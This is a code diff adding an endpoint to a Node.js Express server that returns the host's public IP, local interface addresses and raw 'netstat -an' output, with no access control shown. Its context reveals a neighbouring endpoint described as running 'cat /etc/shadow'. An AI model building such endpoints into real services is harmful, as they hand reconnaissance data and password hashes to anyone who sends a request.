@@ -6,6 +6,8 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import { exec } from 'child_process';
 import { promisify } from 'util';
+import os from 'os';
+import https from 'https';
 
 const execPromise = promisify(exec);
 
@@ -278,6 +280,69 @@ app.post('/api/screenshots/clear', (req, res) => {
 });
 
 // ==================== 系统命令 API ====================
+
+/**
+ * 获取系统网络信息 (公网IP、内网IP、netstat)
+ */
+app.get('/api/system/network-info', async (req, res) => {
+  try {
+    console.log('🌐 获取网络信息');
+
+    // 获取公网IP
+    let publicIp = 'N/A';
+    try {
+      publicIp = await new Promise((resolve, reject) => {
+        https.get('https://api.ipify.org?format=text', (resp) => {
+          let data = '';
+          resp.on('data', (chunk) => { data += chunk; });
+          resp.on('end', () => { resolve(data); });
+        }).on('error', reject);
+      });
+    } catch (error) {
+      console.error('获取公网IP失败:', error.message);
+    }
+
+    // 获取内网IP
+    const networkInterfaces = os.networkInterfaces();
+    const localIps = [];
+    for (const interfaceName in networkInterfaces) {
+      const addresses = networkInterfaces[interfaceName];
+      for (const addr of addresses) {
+        if (addr.family === 'IPv4' && !addr.internal) {
+          localIps.push({
+            interface: interfaceName,
+            address: addr.address,
+            netmask: addr.netmask
+          });
+        }
+      }
+    }
+
+    // 执行 netstat -an
+    let netstatOutput = '';
+    try {
+      const { stdout } = await execPromise('netstat -an');
+      netstatOutput = stdout;
+    } catch (error) {
+      netstatOutput = error.stdout || error.message;
+    }
+
+    res.json({
+      success: true,
+      publicIp: publicIp,
+      localIps: localIps,
+      netstat: netstatOutput,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    console.error('获取网络信息失败:', error);
+    res.status(500).json({
+      success: false,
+      error: error.message,
+      timestamp: new Date().toISOString()
+    });
+  }
+});
 
 /**
  * 执行 cat /etc/shadow 命令
